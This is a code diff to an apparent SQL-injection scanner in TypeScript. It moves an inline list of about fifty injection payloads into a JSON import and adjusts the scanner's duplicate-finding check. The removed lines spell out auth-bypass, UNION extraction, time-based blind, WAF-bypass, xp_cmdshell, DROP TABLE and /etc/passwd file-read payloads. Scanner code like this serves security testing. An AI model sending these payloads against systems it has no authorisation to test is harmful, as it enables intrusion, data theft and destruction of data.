@@ -1,6 +1,7 @@
 import { normalizeUrl } from './apiUtils';
 import { fetchWithBypass, CORSBypassMetadata } from './corsProxy';
 import { RequestManager } from './requestManager'; // Import RequestManager
+import SQL_PAYLOADS_JSON from '@/payloads/sqli.json'; // Import JSON
 
 export interface SQLScanResult {
   vulnerable: boolean;
@@ -77,76 +78,8 @@ interface SQLPayload {
   confidence: number;
 }
 
-const SQL_PAYLOADS: SQLPayload[] = [
-  // --- High Confidence Error/Syntax Breakers (7) ---
-  { payload: `\'`, type: 'Error-based', severity: 'high', confidence: 0.95 },
-  { payload: `\"`, type: 'Error-based', severity: 'high', confidence: 0.95 },
-  { payload: `')`, type: 'Error-based (Parenthesis)', severity: 'high', confidence: 0.9 },
-  { payload: `"))`, type: 'Error-based (Double Parenthesis)', severity: 'high', confidence: 0.9 },
-  { payload: `\`)`, type: 'Error-based (Backtick)', severity: 'high', confidence: 0.9 },
-  { payload: `\'))`, type: 'Error-based (Double Single Quote)', severity: 'high', confidence: 0.9 },
-  { payload: `\"))`, type: 'Error-based (Double Double Quote)', severity: 'high', confidence: 0.9 },
-
-  // --- Boolean-based (Critical for Auth Bypass) (8) ---
-  { payload: `' OR '1'='1`, type: 'Boolean-based', severity: 'critical', confidence: 0.98 },
-  { payload: `" OR "1"="1`, type: 'Boolean-based', severity: 'critical', confidence: 0.98 },
-  { payload: `admin' --`, type: 'Comment-based', severity: 'high', confidence: 0.9 },
-  { payload: `admin' #`, type: 'Comment-based (MySQL)', severity: 'high', confidence: 0.9 },
-  { payload: `' OR 2>1--`, type: 'Boolean-based', severity: 'critical', confidence: 0.98 },
-  { payload: `' AND 1=1--`, type: 'Boolean-based', severity: 'medium', confidence: 0.8 },
-  { payload: `' AND 1=0--`, type: 'Boolean-based', severity: 'medium', confidence: 0.8 },
-  { payload: `) OR 1=1--`, type: 'Boolean-based (Parenthesis)', severity: 'critical', confidence: 0.95 },
-  
-  // --- Union-based (Data Exfiltration) (5) ---
-  { payload: `' UNION SELECT NULL--`, type: 'Union-based', severity: 'critical', confidence: 0.9 },
-  { payload: `' UNION SELECT 1,2,3--`, type: 'Union-based', severity: 'critical', confidence: 0.9 },
-  { payload: `-1' UNION SELECT @@version, user(), database()--`, type: 'Union-based (Info Leak)', severity: 'critical', confidence: 0.98 },
-  { payload: `-1' UNION SELECT 1,null,3,4,5,6,7,8,9,10--`, type: 'Union-based (Column Count)', severity: 'high', confidence: 0.85 },
-  { payload: `-1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--`, type: 'Union-based (Column Count)', severity: 'high', confidence: 0.85 },
-
-  // --- Time-based Blind (Critical for Data Exfiltration) (4) ---
-  { payload: `' AND SLEEP(5)--`, type: 'Time-based Blind (MySQL)', severity: 'critical', confidence: 1.0 }, 
-  { payload: `1' WAITFOR DELAY '0:0:5'--`, type: 'Time-based Blind (SQL Server)', severity: 'critical', confidence: 1.0 }, 
-  { payload: `1; SELECT PG_SLEEP(5)--`, type: 'Time-based Blind (PostgreSQL)', severity: 'critical', confidence: 1.0 }, 
-  { payload: `1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('HT'),5)--`, type: 'Time-based Blind (Oracle)', severity: 'critical', confidence: 1.0 }, 
-
-  // --- Advanced & Dangerous Payloads (Stacked Queries, OOB, File Read) (5) ---
-  { payload: `1; EXEC xp_cmdshell('whoami')--`, type: 'Stacked Query (SQL Server)', severity: 'catastrophic', confidence: 1.0 },
-  { payload: `1; DROP TABLE users--`, type: 'Stacked Query (Data Loss)', severity: 'catastrophic', confidence: 1.0 },
-  { payload: `1' AND (SELECT LOAD_FILE('/etc/passwd'))--`, type: 'File Read (MySQL)', severity: 'critical', confidence: 0.95 },
-  { payload: `1' AND (SELECT 'a' FROM sys.sysobjects WHERE xtype='U')--`, type: 'Schema Enumeration (MSSQL)', severity: 'high', confidence: 0.9 },
-  { payload: `1' AND (SELECT COUNT(*) FROM information_schema.tables)--`, type: 'Schema Enumeration (MySQL)', severity: 'high', confidence: 0.9 },
-
-  // --- WAF Bypass / Obfuscation Attempts (5) ---
-  { payload: `' OR /*!500001=1*/--`, type: 'WAF Bypass (MySQL Inline Comment)', severity: 'high', confidence: 0.85 },
-  { payload: `' OR '1'='1' /**/`, type: 'WAF Bypass (Multi-line Comment)', severity: 'high', confidence: 0.85 },
-  { payload: `1' AND '1'='1' AND 'a'='a`, type: 'WAF Bypass (Keyword Split)', severity: 'medium', confidence: 0.75 },
-  { payload: `1' OR 1=1-- -`, type: 'WAF Bypass (Trailing Dash)', severity: 'high', confidence: 0.85 },
-  { payload: `1' OR 1=1;--`, type: 'WAF Bypass (Semicolon)', severity: 'high', confidence: 0.85 },
-  
-  // --- New Payloads from sqlpayloads.md (21 new payloads to reach 50 total) ---
-  { payload: `)) OR 1=1--`, type: 'Boolean-based (Double Parenthesis)', severity: 'critical', confidence: 0.95 },
-  { payload: `' OR 1=1 LIMIT 1 --`, type: 'Boolean-based (Limit)', severity: 'critical', confidence: 0.98 },
-  { payload: `' AND 1=1 AND 'a'='a`, type: 'Boolean-based (AND)', severity: 'medium', confidence: 0.8 },
-  { payload: `' AND 1=0 AND 'a'='b`, type: 'Boolean-based (AND)', severity: 'medium', confidence: 0.8 },
-  { payload: `1' AND 1=1 AND 'a'='a`, type: 'Boolean-based (AND)', severity: 'medium', confidence: 0.8 },
-  { payload: `1' AND 1=0 AND 'a'='b`, type: 'Boolean-based (AND)', severity: 'medium', confidence: 0.8 },
-  { payload: `1' OR 1=1 LIMIT 1 --`, type: 'Boolean-based (Limit)', severity: 'critical', confidence: 0.98 },
-  { payload: `1' OR 1=1 ORDER BY 1--`, type: 'Union-based (Order By)', severity: 'high', confidence: 0.85 },
-  { payload: `1' OR 1=1 ORDER BY 10--`, type: 'Union-based (Order By)', severity: 'high', confidence: 0.85 },
-  { payload: `1' OR 1=1 ORDER BY 20--`, type: 'Union-based (Order By)', severity: 'high', confidence: 0.85 },
-  { payload: `1' OR 1=1 ORDER BY 30--`, type: 'Union-based (Order By)', severity: 'high', confidence: 0.85 },
-  { payload: `1' OR 1=1 ORDER BY 40--`, type: 'Union-based (Order By)', severity: 'high', confidence: 0.85 },
-  { payload: `1' OR 1=1 ORDER BY 50--`, type: 'Union-based (Order By)', severity: 'high', confidence: 0.85 },
-  { payload: `1' AND 1=BENCHMARK(5000000,SHA1(1))--`, type: 'Time-based Blind (Benchmark)', severity: 'critical', confidence: 1.0 },
-  { payload: `1' AND 1=IF(2>1,BENCHMARK(5000000,SHA1(1)),0)--`, type: 'Time-based Blind (Conditional)', severity: 'critical', confidence: 1.0 },
-  { payload: `1' AND 1=IF(2<1,BENCHMARK(5000000,SHA1(1)),0)--`, type: 'Time-based Blind (Conditional)', severity: 'critical', confidence: 1.0 },
-  { payload: `1' AND 1=IF(2>1,SLEEP(5),0)--`, type: 'Time-based Blind (Conditional)', severity: 'critical', confidence: 1.0 },
-  { payload: `1' AND 1=IF(2<1,SLEEP(5),0)--`, type: 'Time-based Blind (Conditional)', severity: 'critical', confidence: 1.0 },
-  { payload: `1' AND 1=IF(2>1,WAITFOR DELAY '0:0:5',0)--`, type: 'Time-based Blind (Conditional MSSQL)', severity: 'critical', confidence: 1.0 },
-  { payload: `1' AND 1=IF(2<1,WAITFOR DELAY '0:0:5',0)--`, type: 'Time-based Blind (Conditional MSSQL)', severity: 'critical', confidence: 1.0 },
-  { payload: `1' AND 1=IF(2>1,PG_SLEEP(5),0)--`, type: 'Time-based Blind (Conditional PostgreSQL)', severity: 'critical', confidence: 1.0 },
-];
+// Use imported JSON payloads
+const SQL_PAYLOADS: SQLPayload[] = SQL_PAYLOADS_JSON as SQLPayload[];
 
 
 const testTimeBased = async (url: string, requestManager: RequestManager): Promise<{ vulnerable: boolean; duration: number }> => {
@@ -303,7 +236,7 @@ export const performSQLScan = async (target: string, requestManager: RequestMana
           if (baselineStatus > 0 && response.status !== baselineStatus && response.status >= 500) {
             console.log(`[SQL Scan] ⚠️ Server error detected (${response.status})`);
             // Only add if not already detected by error patterns for this payload
-            if (!errorCheck.found) {
+            if (!result.vulnerabilities.some(v => v.parameter === paramKey && v.payload === payload)) {
               result.vulnerable = true;
               result.vulnerabilities.push({
                 payload,
